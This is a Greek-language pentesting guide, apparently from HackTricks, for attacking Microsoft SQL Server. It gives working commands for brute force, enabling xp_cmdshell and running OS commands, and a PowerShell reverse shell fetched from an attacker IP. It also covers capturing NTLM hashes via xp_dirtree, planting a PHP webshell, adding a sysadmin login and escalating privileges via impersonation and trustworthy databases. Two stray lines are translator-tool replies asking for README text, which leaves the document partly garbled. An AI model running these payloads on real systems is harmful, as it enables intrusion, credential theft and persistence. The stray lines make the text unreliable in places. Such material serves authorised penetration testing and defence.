# 1433 - Pentesting MSSQL - Microsoft SQL Server

{{#include ../../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

Από [wikipedia](https://en.wikipedia.org/wiki/Microsoft_SQL_Server):

> **Microsoft SQL Server** είναι ένα σύστημα διαχείρισης **σχεσιακών βάσεων δεδομένων** που αναπτύχθηκε από την Microsoft. Ως διακομιστής βάσεων δεδομένων, είναι ένα προϊόν λογισμικού με την κύρια λειτουργία της αποθήκευσης και ανάκτησης δεδομένων όπως ζητείται από άλλες εφαρμογές λογισμικού — οι οποίες μπορεί να τρέχουν είτε στον ίδιο υπολογιστή είτε σε άλλο υπολογιστή μέσω δικτύου (συμπεριλαμβανομένου του Διαδικτύου).

**Προεπιλεγμένη θύρα:** 1433
```
1433/tcp open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
```
### Προσγείωση σε Managed Database-as-a-Service (DBaaS)

Ό,τι εξαρτάται από την "owning the host" (π.χ., privilege escalation, lateral movement, και OS command execution) παύει να υφίσταται σε DBaaS. Pentesting σε αυτά τα περιβάλλοντα πρέπει να στρέφεται προς εκμετάλλευση σε επίπεδο εφαρμογής, data exfiltration μέσω SQL λογικής, misconfigured IAM roles, ή κακή σχεδίαση δικτύου/VPC. Για παράδειγμα, the [Amazon RDS documentation](https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/SQLServer.Concepts.General.FeatureNonSupport.html) δηλώνει ρητά ότι `xp_cmdshell` και η ιδιότητα βάσης δεδομένων `TRUSTWORTHY` δεν υποστηρίζονται.

> [!WARNING]
> Λαμβάνετε ένα database endpoint, όχι έναν διακομιστή. Ο πάροχος cloud διαχειρίζεται το host OS, τα binary του database engine, και πολλές πολιτικές ασφαλείας.

### **Προεπιλεγμένες Βάσεις Συστήματος MS-SQL**

- **master Database**: Αυτή η βάση είναι κρίσιμη καθώς καταγράφει όλες τις πληροφορίες σε επίπεδο συστήματος για ένα SQL Server instance.
- **msdb Database**: Ο SQL Server Agent χρησιμοποιεί αυτή τη βάση για να διαχειρίζεται τον προγραμματισμό ειδοποιήσεων και εργασιών.
- **model Database**: Λειτουργεί ως πρότυπο για κάθε νέα βάση στην SQL Server instance, όπου οποιεσδήποτε τροποποιήσεις όπως μέγεθος, collation, recovery model και άλλα αντικατοπτρίζονται στις νεοδημιουργούμενες βάσεις.
- **Resource Database**: Μια read-only βάση που περιέχει αντικείμενα συστήματος που συνοδεύουν τον SQL Server. Αυτά τα αντικείμενα, παρότι αποθηκεύονται φυσικά στη Resource database, παρουσιάζονται λογικά στο σχήμα sys κάθε βάσης.
- **tempdb Database**: Λειτουργεί ως προσωρινός χώρος αποθήκευσης για παροδικά αντικείμενα ή ενδιάμεσα σύνολα αποτελεσμάτων.

## Καταγραφή

### Αυτόματη Καταγραφή

If you don't know anything about the service:
```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
msf> use auxiliary/scanner/mssql/mssql_ping
```
> [!TIP]
> Εάν **δεν** **έχετε credentials** μπορείτε να προσπαθήσετε να τα μαντέψετε. Μπορείτε να χρησιμοποιήσετε nmap ή metasploit. Προσοχή, μπορείτε να **block accounts** αν αποτύχετε στο login αρκετές φορές χρησιμοποιώντας ένα υπάρχον username.
#### Metasploit (need creds)
```bash
#Set USERNAME, RHOSTS and PASSWORD
#Set DOMAIN and USE_WINDOWS_AUTHENT if domain is used

#Steal NTLM
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer #Steal NTLM hash, before executing run Responder

#Info gathering
msf> use admin/mssql/mssql_enum #Security checks
msf> use admin/mssql/mssql_enum_domain_accounts
msf> use admin/mssql/mssql_enum_sql_logins
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/scanner/mssql/mssql_hashdump
msf> use auxiliary/scanner/mssql/mssql_schemadump

#Search for insteresting data
msf> use auxiliary/admin/mssql/mssql_findandsampledata
msf> use auxiliary/admin/mssql/mssql_idf

#Privesc
msf> use exploit/windows/mssql/mssql_linkcrawler
msf> use admin/mssql/mssql_escalate_execute_as #If the user has IMPERSONATION privilege, this will try to escalate
msf> use admin/mssql/mssql_escalate_dbowner #Escalate from db_owner to sysadmin

#Code execution
msf> use admin/mssql/mssql_exec #Execute commands
msf> use exploit/windows/mssql/mssql_payload #Uploads and execute a payload

#Add new admin user from meterpreter session
msf> use windows/manage/mssql_local_auth_bypass
```
### [**Brute force**](../../generic-hacking/brute-force.md#sql-server)

### **Απαρίθμηση χρηστών μέσω RID Brute Force**

Μπορείτε να απαριθμήσετε τους χρήστες του domain μέσω MSSQL κάνοντας brute-force στα RIDs (Relative Identifiers). Αυτή η τεχνική είναι χρήσιμη όταν έχετε έγκυρα διαπιστευτήρια αλλά περιορισμένα προνόμια:
```bash
# Using NetExec (nxc) - formerly CrackMapExec
nxc mssql <IP> --local-auth -u <username> -p '<password>' --rid-brute 5000

# Examples:
nxc mssql 10.129.234.50 --local-auth -u sqlguest -p 'zDPBpaF4FywlqIv11vii' --rid-brute 5000
nxc mssql 10.10.10.59 -u sa -p 'P@ssw0rd' --rid-brute 10000

# Without --local-auth for domain accounts
nxc mssql 10.10.10.59 -u DOMAIN\\user -p 'password' --rid-brute 5000
```
Μπορείτε να επικολλήσετε το περιεχόμενο του αρχείου src/network-services-pentesting/pentesting-mssql-microsoft-sql-server/README.md εδώ; Χρειάζομαι το κείμενο για να το μεταφράσω στα Ελληνικά, διατηρώντας ίδια τα markdown/html tags και τα paths/links.
```
[snippet]
MSSQL                    10.129.234.50   1433   DC               1104: REDELEGATE\Christine.Flanders
MSSQL                    10.129.234.50   1433   DC               1105: REDELEGATE\Marie.Curie
MSSQL                    10.129.234.50   1433   DC               1106: REDELEGATE\Helen.Frost
MSSQL                    10.129.234.50   1433   DC               1107: REDELEGATE\Michael.Pontiac
MSSQL                    10.129.234.50   1433   DC               1108: REDELEGATE\Mallory.Roberts
MSSQL                    10.129.234.50   1433   DC               1109: REDELEGATE\James.Dinkleberg
[snippet]
```
**Παραμέτροι:**
- `--local-auth`: Χρήση τοπικής πιστοποίησης αντί για domain
- `--rid-brute <max_rid>`: Brute force RIDs έως τον καθορισμένο αριθμό (προεπιλογή: 4000)
- `-u`: Username
- `-p`: Password

Αυτή η τεχνική θα καταγράψει χρήστες κάνοντας ερωτήματα στον MSSQL server για πληροφορίες λογαριασμών που σχετίζονται με διαδοχικά RIDs.

### Χειροκίνητη Αναγνώριση

#### Σύνδεση

[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt

# Bruteforce using tickets against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt

# Bruteforce using passwords against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt

# Bruteforce using hashes against the hosts listed on the hosts.txt
mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
```

```bash
# Using Impacket mssqlclient.py
mssqlclient.py [-db volume] <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
## Recommended -windows-auth when you are going to use a domain. Use as domain the netBIOS name of the machine
mssqlclient.py [-db volume] -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>

# Using sqsh
sqsh -S <IP> -U <Username> -P <Password> -D <Database>
## In case Windows Auth using "." as domain name for local user
sqsh -S <IP> -U .\\<Username> -P <Password> -D <Database>
## In sqsh you need to use GO after writting the query to send it
1> select 1;
2> go
```
#### Συνηθισμένη Ανίχνευση
```sql
# Get version
select @@version;
# Get user
select user_name();
# Get databases
SELECT name FROM master.dbo.sysdatabases;
# Use database
USE master

#Get table names
SELECT * FROM <databaseName>.INFORMATION_SCHEMA.TABLES;
#List Linked Servers
EXEC sp_linkedservers
SELECT * FROM sys.servers;
#List users
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
#Create user with sysadmin privs
CREATE LOGIN hacker WITH PASSWORD = 'P@ssword123!'
EXEC sp_addsrvrolemember 'hacker', 'sysadmin'

#Enumerate links
enum_links
#Use a link
use_link [NAME]
```
#### Λήψη χρήστη


{{#ref}}
types-of-mssql-users.md
{{#endref}}
```sql
# Get all the users and roles
select * from sys.database_principals;
## This query filters a bit the results
select name,
create_date,
modify_date,
type_desc as type,
authentication_type_desc as authentication_type,
sid
from sys.database_principals
where type not in ('A', 'R')
order by name;

## Both of these select all the users of the current database (not the server).
## Interesting when you cannot acces the table sys.database_principals
EXEC sp_helpuser
SELECT * FROM sysusers
```
#### Απόκτηση Δικαιωμάτων

1. **Securable:** Ορίζεται ως οι πόροι που διαχειρίζεται το SQL Server για τον έλεγχο πρόσβασης. Κατατάσσονται σε:
- **Server** – Παραδείγματα περιλαμβάνουν databases, logins, endpoints, availability groups και server roles.
- **Database** – Παραδείγματα περιλαμβάνουν database role, application roles, schema, certificates, full text catalogs και users.
- **Schema** – Περιλαμβάνει tables, views, procedures, functions, synonyms κ.λπ.
2. **Permission:** Σχετίζεται με τα securables του SQL Server — δικαιώματα όπως ALTER, CONTROL και CREATE μπορούν να παραχωρηθούν σε έναν principal. Η διαχείριση των δικαιωμάτων γίνεται σε δύο επίπεδα:
- **Server Level** χρησιμοποιώντας logins
- **Database Level** χρησιμοποιώντας users
3. **Principal:** Ο όρος αναφέρεται στην οντότητα στην οποία παραχωρείται δικαίωμα σε ένα securable. Οι principals περιλαμβάνουν κυρίως logins και database users. Ο έλεγχος πρόσβασης στα securables ασκείται μέσω της παραχώρησης ή άρνησης δικαιωμάτων ή με την ένταξη logins και users σε ρόλους που διαθέτουν δικαιώματα πρόσβασης.
```sql
# Show all different securables names
SELECT distinct class_desc FROM sys.fn_builtin_permissions(DEFAULT);
# Show all possible permissions in MSSQL
SELECT * FROM sys.fn_builtin_permissions(DEFAULT);
# Get all my permissions over securable type SERVER
SELECT * FROM fn_my_permissions(NULL, 'SERVER');
# Get all my permissions over a database
USE <database>
SELECT * FROM fn_my_permissions(NULL, 'DATABASE');
# Get members of the role "sysadmin"
Use master
EXEC sp_helpsrvrolemember 'sysadmin';
# Get if the current user is sysadmin
SELECT IS_SRVROLEMEMBER('sysadmin');
# Get users that can run xp_cmdshell
Use master
EXEC sp_helprotect 'xp_cmdshell'
```
## Κόλπα

### Εκτέλεση εντολών OS

> [!CAUTION]
> Σημειώστε ότι για να μπορείτε να εκτελείτε εντολές δεν αρκεί μόνο η **`xp_cmdshell`** να είναι **ενεργοποιημένη**, αλλά χρειάζεται επίσης να έχετε την **άδεια EXECUTE στην αποθηκευμένη διαδικασία `xp_cmdshell`**. Μπορείτε να δείτε ποιος (εκτός από τους sysadmins) μπορεί να χρησιμοποιήσει την **`xp_cmdshell`** με:
>
> ```sql
> Use master
> EXEC sp_helprotect 'xp_cmdshell'
> ```
```bash
# Username + Password + CMD command
crackmapexec mssql -d <Domain name> -u <username> -p <password> -x "whoami"
# Username + Hash + PS command
crackmapexec mssql -d <Domain name> -u <username> -H <HASH> -X '$PSVersionTable'

# Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';

# This turns on advanced options and is needed to configure xp_cmdshell
sp_configure 'show advanced options', '1'
RECONFIGURE
#This enables xp_cmdshell
sp_configure 'xp_cmdshell', '1'
RECONFIGURE

#One liner
EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

# Quickly check what the service account is via xp_cmdshell
EXEC master..xp_cmdshell 'whoami'
# Get Rev shell
EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.13:8000/rev.ps1") | powershell -noprofile'

# Bypass blackisted "EXEC xp_cmdshell"
'; DECLARE @x AS VARCHAR(100)='xp_cmdshell'; EXEC @x 'ping k7s3rpqn8ti91kvy0h44pre35ublza.burpcollaborator.net' —
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Executing custom assembly on the current server with windows authentication and executing hostname command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname

# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname

# Executing the hostname command using stored procedures on the linked SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname

# Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate
```
### WMI-based remote SQL collection (sqlcmd + CSV export)

Οι Operators μπορούν να pivot από ένα IIS/app tier σε SQL Servers χρησιμοποιώντας WMI για να εκτελέσουν ένα μικρό batch που αυθεντικοποιείται σε MSSQL και τρέχει ad‑hoc queries, εξάγοντας τα αποτελέσματα σε CSV. Αυτό κρατά τη συλλογή απλή και την εναρμονίζει με τη δραστηριότητα admin.

Παράδειγμα mssq.bat
```bat
@echo off
rem Usage: mssq.bat <server> <user> <pass> <"SQL"> <out.csv>
set S=%1
set U=%2
set P=%3
set Q=%4
set O=%5
rem Remove headers, trim trailing spaces, CSV separator = comma
sqlcmd -S %S% -U %U% -P %P% -Q "SET NOCOUNT ON; %Q%" -W -h -1 -s "," -o "%O%"
```
Εκτέλεσέ το απομακρυσμένα μέσω WMI
```cmd
wmic /node:SQLHOST /user:DOMAIN\user /password:Passw0rd! process call create "cmd.exe /c C:\\Windows\\Temp\\mssq.bat 10.0.0.5 sa P@ssw0rd \"SELECT TOP(100) name FROM sys.tables\" C:\\Windows\\Temp\\out.csv"
```
Εναλλακτική του PowerShell
```powershell
$cmd = 'cmd.exe /c C:\\Windows\\Temp\\mssq.bat 10.0.0.5 sa P@ssw0rd "SELECT name FROM sys.databases" C:\\Windows\\Temp\\dbs.csv'
Invoke-WmiMethod -ComputerName SQLHOST -Class Win32_Process -Name Create -ArgumentList $cmd
```
Σημειώσεις
- Το sqlcmd μπορεί να λείπει· χρησιμοποιήστε ως εναλλακτική το osql, PowerShell Invoke-Sqlcmd, ή ένα one‑liner που χρησιμοποιεί System.Data.SqlClient.
- Χρησιμοποιήστε το quoting με προσοχή· οι μεγάλες/πολύπλοκες queries είναι ευκολότερο να δοθούν μέσω αρχείου ή ως Base64‑encoded παράμετρος που αποκωδικοποιείται μέσα στο batch/PowerShell stub.
- Exfil το CSV μέσω SMB (π.χ., copy από \\SQLHOST\C$\Windows\Temp) ή συμπιέστε και μεταφέρετέ το μέσω του C2.



### Λήψη hashed κωδικών
```bash
SELECT * FROM master.sys.syslogins;
```
### Υποκλοπή NetNTLM hash / Relay attack

Πρέπει να εκκινήσετε έναν **SMB server** για να καταγράψετε το hash που χρησιμοποιείται στην authentication (`impacket-smbserver` ή `responder` για παράδειγμα).
```bash
xp_dirtree '\\<attacker_IP>\any\thing'
exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
EXEC master..xp_subdirs '\\<attacker_IP>\anything\'
EXEC master..xp_fileexist '\\<attacker_IP>\anything\'

# Capture hash
sudo responder -I tun0
sudo impacket-smbserver share ./ -smb2support
msf> use auxiliary/admin/mssql/mssql_ntlm_stealer
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
> [!WARNING]
> Μπορείτε να ελέγξετε ποιος (εκτός από sysadmins) έχει δικαιώματα να εκτελέσει αυτές τις MSSQL συναρτήσεις με:
>
> ```sql
> Use master;
> EXEC sp_helprotect 'xp_dirtree';
> EXEC sp_helprotect 'xp_subdirs';
> EXEC sp_helprotect 'xp_fileexist';
> ```

Χρησιμοποιώντας εργαλεία όπως **responder** ή **Inveigh** είναι δυνατό να **υποκλέψετε το NetNTLM hash**.\
Μπορείτε να δείτε πώς να χρησιμοποιήσετε αυτά τα εργαλεία στο:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### Κατάχρηση των trusted Links του MSSQL

[**Read this post**](../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md) **για περισσότερες πληροφορίες σχετικά με το πώς να καταχραστείτε αυτή τη λειτουργία:**

{{#ref}}
../../windows-hardening/active-directory-methodology/abusing-ad-mssql.md
{{#endref}}

### **Εγγραφή αρχείων**

Για να γράψουμε αρχεία χρησιμοποιώντας `MSSQL`, πρέπει να ενεργοποιήσουμε [**Ole Automation Procedures**](https://docs.microsoft.com/en-us/sql/database-engine/configure-windows/ole-automation-procedures-server-configuration-option), το οποίο απαιτεί δικαιώματα διαχειριστή, και στη συνέχεια να εκτελέσουμε μερικές αποθηκευμένες διαδικασίες για να δημιουργήσουμε το αρχείο:
```bash
# Enable Ole Automation Procedures
sp_configure 'show advanced options', 1
RECONFIGURE

sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

# Create a File
DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
```
### **Ανάγνωση αρχείου με** OPENROWSET

Προεπιλεγμένα, το `MSSQL` επιτρέπει την ανάγνωση οποιουδήποτε αρχείου στο λειτουργικό σύστημα στο οποίο ο λογαριασμός έχει δικαίωμα ανάγνωσης. Μπορούμε να χρησιμοποιήσουμε το ακόλουθο SQL ερώτημα:
```sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
```
Ωστόσο, η επιλογή **`BULK`** απαιτεί την άδεια **`ADMINISTER BULK OPERATIONS`** ή την άδεια **`ADMINISTER DATABASE BULK OPERATIONS`**.
```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='ADMINISTER BULK OPERATIONS' OR permission_name='ADMINISTER DATABASE BULK OPERATIONS';
```
#### Διάνυσμα Error-based για SQLi:
```
https://vuln.app/getItem?id=1+and+1=(select+x+from+OpenRowset(BULK+'C:\Windows\win.ini',SINGLE_CLOB)+R(x))--
```
### **RCE/Ανάγνωση αρχείων — εκτέλεση scripts (Python και R)**

MSSQL μπορεί να σας επιτρέψει να εκτελέσετε **scripts σε Python και/ή R**. Αυτός ο κώδικας θα εκτελεστεί από έναν **διαφορετικό χρήστη** από αυτόν που χρησιμοποιεί την **xp_cmdshell** για να εκτελέσει εντολές.

Παράδειγμα που προσπαθεί να εκτελέσει ένα **'R'** _"Hellow World!"_ — **δεν λειτουργεί**:

![](<../../images/image (393).png>)

Παράδειγμα χρήσης διαμορφωμένου Python για την εκτέλεση πολλαπλών ενεργειών:
```sql
# Print the user being used (and execute commands)
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("getpass").getuser())'
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(__import__("os").system("whoami"))'
#Open and read a file
EXECUTE sp_execute_external_script @language = N'Python', @script = N'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'
#Multiline
EXECUTE sp_execute_external_script @language = N'Python', @script = N'
import sys
print(sys.version)
'
GO
```
### Ανάγνωση Μητρώου

Το Microsoft SQL Server παρέχει **εκτεταμένες αποθηκευμένες διαδικασίες** που σας επιτρέπουν να αλληλεπιδράσετε όχι μόνο με το δίκτυο αλλά και με το σύστημα αρχείων και ακόμη με το [**Windows Registry**](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/)**:**

| **Κανονικές**               | **Instance-Aware**                   |
| --------------------------- | ------------------------------------ |
| sys.xp_regread              | sys.xp_instance_regread              |
| sys.xp_regenumvalues        | sys.xp_instance_regenumvalues        |
| sys.xp_regenumkeys          | sys.xp_instance_regenumkeys          |
| sys.xp_regwrite             | sys.xp_instance_regwrite             |
| sys.xp_regdeletevalue       | sys.xp_instance_regdeletevalue       |
| sys.xp_regdeletekey         | sys.xp_instance_regdeletekey         |
| sys.xp_regaddmultistring    | sys.xp_instance_regaddmultistring    |
| sys.xp_regremovemultistring | sys.xp_instance_regremovemultistring |
```sql
# Example read registry
EXECUTE master.sys.xp_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\Microsoft SQL Server\MSSQL12.SQL2014\SQLServerAgent', 'WorkingDirectory';
# Example write and then read registry
EXECUTE master.sys.xp_instance_regwrite 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue', 'REG_SZ', 'Now you see me!';
EXECUTE master.sys.xp_instance_regread 'HKEY_LOCAL_MACHINE', 'Software\Microsoft\MSSQLSERVER\SQLServerAgent\MyNewKey', 'MyNewValue';
# Example to check who can use these functions
Use master;
EXEC sp_helprotect 'xp_regread';
EXEC sp_helprotect 'xp_regwrite';
```
Για **περισσότερα παραδείγματα** δείτε την [**αρχική πηγή**](https://blog.waynesheffield.com/wayne/archive/2017/08/working-registry-sql-server/).

### RCE με MSSQL User Defined Function - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a>

Είναι δυνατόν να φορτώσετε ένα .NET dll μέσα σε MSSQL με custom functions. Αυτό, ωστόσο, **απαιτεί `dbo` access**, οπότε χρειάζεστε σύνδεση στη βάση δεδομένων **ως `sa` ή με ρόλο Administrator**.

[**Ακολουθώντας αυτόν τον σύνδεσμο**](../../pentesting-web/sql-injection/mssql-injection.md#mssql-user-defined-function-sqlhttp) για να δείτε ένα παράδειγμα.

### RCE με `autoadmin_task_agents`

Σύμφωνα [**με αυτή την ανάρτηση**](https://exploit7-tr.translate.goog/posts/sqlserver/?_x_tr_sl=es&_x_tr_tl=en&_x_tr_hl=en&_x_tr_pto=wapp), είναι επίσης δυνατό να φορτωθεί μια απομακρυσμένη dll και να αναγκάσετε την MSSQL να την εκτελέσει με κάτι σαν:
```sql
update autoadmin_task_agents set task_assembly_name = "class.dll", task_assembly_path="\\remote-server\\ping.dll",className="Class1.Class1";
```
I don't see the README.md content to translate. Please paste the file text (or the portions you want translated), and I'll translate the English parts to Greek while preserving all markdown, code, links, tags, and hacking terms.
```csharp
using Microsoft.SqlServer.SmartAdmin;
using System;
using System.Diagnostics;

namespace Class1
{
public class Class1 : TaskAgent
{
public Class1()
{

Process process = new Process();
process.StartInfo.FileName = "cmd.exe";
process.StartInfo.Arguments = "/c ping localhost -t";
process.StartInfo.UseShellExecute = false;
process.StartInfo.RedirectStandardOutput = true;
process.Start();
process.WaitForExit();
}

public override void DoWork()
{

}

public override void ExternalJob(string command, LogBaseService jobLogger)
{

}

public override void Start(IServicesFactory services)
{

}

public override void Stop()
{

}


public void Test()
{

}
}
}
```
### Άλλοι τρόποι για RCE

Υπάρχουν και άλλες μέθοδοι για να αποκτήσετε εκτέλεση εντολών, όπως η προσθήκη [extended stored procedures](https://docs.microsoft.com/en-us/sql/relational-databases/extended-stored-procedures-programming/adding-an-extended-stored-procedure-to-sql-server), [CLR Assemblies](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration), [SQL Server Agent Jobs](https://docs.microsoft.com/en-us/sql/ssms/agent/schedule-a-job?view=sql-server-ver15), και [external scripts](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-execute-external-script-transact-sql).

## MSSQL Privilege Escalation

### Από db_owner σε sysadmin

Αν σε έναν **κανονικό χρήστη** δοθεί ο ρόλος **`db_owner`** επί της **βάσης δεδομένων που ανήκει σε χρήστη admin** (όπως ο **`sa`**) και αυτή η βάση δεδομένων έχει ρυθμιστεί ως **`trustworthy`**, ο χρήστης μπορεί να καταχραστεί αυτά τα προνόμια για **privesc**, επειδή οι **stored procedures** που δημιουργούνται εκεί μπορούν να **execute** ως ο owner (**admin**).
```sql
# Get owners of databases
SELECT suser_sname(owner_sid) FROM sys.databases

# Find trustworthy databases
SELECT a.name,b.is_trustworthy_on
FROM master..sysdatabases as a
INNER JOIN sys.databases as b
ON a.name=b.name;

# Get roles over the selected database (look for your username as db_owner)
USE <trustworthy_db>
SELECT rp.name as database_role, mp.name as database_user
from sys.database_role_members drm
join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)

# If you found you are db_owner of a trustworthy database, you can privesc:
--1. Create a stored procedure to add your user to sysadmin role
USE <trustworthy_db>

CREATE PROCEDURE sp_elevate_me
WITH EXECUTE AS OWNER
AS
EXEC sp_addsrvrolemember 'USERNAME','sysadmin'

--2. Execute stored procedure to get sysadmin role
USE <trustworthy_db>
EXEC sp_elevate_me

--3. Verify your user is a sysadmin
SELECT is_srvrolemember('sysadmin')
```
Μπορείτε να χρησιμοποιήσετε ένα **metasploit** module:
```bash
msf> use auxiliary/admin/mssql/mssql_escalate_dbowner
```
Ή ένα **PS** script:
```bash
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-Dbowner.psm1
Import-Module .Invoke-SqlServerDbElevateDbOwner.psm1
Invoke-SqlServerDbElevateDbOwner -SqlUser myappuser -SqlPass MyPassword! -SqlServerInstance 10.2.2.184
```
### Υποκλοπή ταυτότητας άλλων χρηστών

Ο SQL Server διαθέτει ειδική άδεια, με όνομα **`IMPERSONATE`**, που **επιτρέπει στον εκτελούντα χρήστη να αναλαμβάνει τα δικαιώματα ενός άλλου χρήστη** ή login μέχρι να επαναφερθεί το context ή να τερματιστεί η συνεδρία.
```sql
# Find users you can impersonate
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
# Check if the user "sa" or any other high privileged user is mentioned

# Impersonate sa user
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')

# If you can't find any users, make sure to check for links
enum_links
# If there is a link of interest, re-run the above steps on each link
use_link [NAME]
```
> [!TIP]
> Αν μπορείτε να impersonate έναν χρήστη, ακόμα κι αν δεν είναι sysadmin, πρέπει να ελέγξετε i**αν ο χρήστης έχει πρόσβαση** σε άλλες **databases** ή linked servers.

Σημειώστε ότι μόλις είστε sysadmin μπορείτε να impersonate οποιονδήποτε άλλο:
```sql
-- Impersonate RegUser
EXECUTE AS LOGIN = 'RegUser'
-- Verify you are now running as the the MyUser4 login
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
-- Change back to sa
REVERT
```
Μπορείτε να εκτελέσετε αυτή την επίθεση με ένα **metasploit** module:
```bash
msf> auxiliary/admin/mssql/mssql_escalate_execute_as
```
ή με ένα **PS** script:
```bash
# https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-ExecuteAs.psm1
Import-Module .Invoke-SqlServer-Escalate-ExecuteAs.psm1
Invoke-SqlServer-Escalate-ExecuteAs -SqlServerInstance 10.2.9.101 -SqlUser myuser1 -SqlPass MyPassword!
```
## Χρήση MSSQL για Διατήρηση Πρόσβασης

[https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/](https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/)

## Εξαγωγή κωδικών από SQL Server Linked Servers

Ένας επιτιθέμενος μπορεί να εξαγάγει τους κωδικούς των SQL Server Linked Servers από τα SQL Instances και να τους λάβει σε απλό κείμενο, παρέχοντας κωδικούς που μπορούν να χρησιμοποιηθούν για να αποκτήσει μεγαλύτερο έλεγχο επί του στόχου. Το script για την εξαγωγή και την αποκρυπτογράφηση των κωδικών που αποθηκεύονται για τους Linked Servers βρίσκεται [εδώ](https://www.richardswinbank.net/admin/extract_linked_server_passwords)

Απαιτούνται ορισμένες προϋποθέσεις και ρυθμίσεις για να λειτουργήσει αυτό το exploit. Πρώτα απ' όλα, πρέπει να έχετε δικαιώματα Administrator στη μηχανή, ή τη δυνατότητα διαχείρισης των SQL Server Configurations.

Μετά την επαλήθευση των δικαιωμάτων σας, χρειάζεται να διαμορφώσετε τρία πράγματα, τα οποία είναι τα εξής:

1. Ενεργοποιήστε το TCP/IP στα SQL Server instances;
